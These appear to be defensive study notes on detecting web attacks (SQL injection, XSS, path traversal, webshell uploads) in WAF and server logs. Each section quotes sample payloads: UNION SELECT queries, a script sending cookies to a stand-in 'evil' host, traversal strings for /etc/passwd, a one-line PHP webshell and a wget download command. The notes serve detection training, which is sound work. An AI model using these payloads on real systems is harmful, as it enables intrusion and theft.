Elaborated Notes with Examples
1. SQL Injection Detection

SQLi occurs when user input is concatenated into SQL queries. Common patterns: ' OR '1'='1 for auth bypass, UNION SELECT for data extraction, and blind SQLi using AND 1=1 / AND 1=2 responses. Look for special characters, SQL keywords, and anomalous response sizes in WAF/IDS logs.

Example: WAF log shows GET /product?id=1'+UNION+SELECT+1,2,3,4,5,@@version,user(),7-- HTTP/1.1 with 200 response and 12KB body (vs normal 2KB). The WAF triggered rule 942100 (SQL Injection Attack Detected via libinjection). The attacker extracted Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 and dbo@sql-svr-01.
2. Cross-Site Scripting (XSS)

XSS injects scripts into web pages viewed by other users. Reflected XSS appears in URLs (<script>alert('xss')</script>), stored XSS is persisted in the database. Detection: look for <script>, onerror, javascript:, <img src=x onerror=...> in logs and server responses.

Example (Stored XSS): A comment on /product/review contains <script>fetch('hxxp://evil/steal?c='+document.cookie)</script>. The web server log shows POST /product/review with the payload in the body. When any user visits the product page, the script executes and exfiltrates session cookies. The analyst finds 127 cookie theft alerts in the SIEM and identifies the attacker IP.
3. Path Traversal

Path traversal exploits insufficient input sanitization to read files outside the web root. Common patterns: ../../../etc/passwd, ..%2f..%2f, %2e%2e%2f, ....//....//. Detection in access logs and WAF with rule IDs for traversal attempts.

Example: WAF log: GET /download?file=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1 with response code 200 containing root:x:0:0:root:/root:/bin/bash. The double URL encoding (%252f) bypasses basic input filters. The server response reveals the application runs as www-data. The analyst blocks the source IP and identifies the vulnerability in the file download function.
4. File Upload / Webshells

Unrestricted file upload allows attackers to upload malicious files (PHP/JSP/ASP webshells, .htaccess, .config) that give remote code execution. Detection involves monitoring for unexpected file extensions, file size anomalies, and outbound traffic from the web server.

Example: Access log shows POST /upload.php with file cmd.php from IP 10.0.0.5. Content: <?php system($_GET['cmd']); ?>. Five seconds later: GET /uploads/cmd.php?cmd=id HTTP/1.1 returning uid=33(www-data). Then cmd=cat+/etc/passwd, cmd=wget+hxxp://evil/tools.sh. The WAF triggered no rule because the file was uploaded as image/png (MIME type tampered).
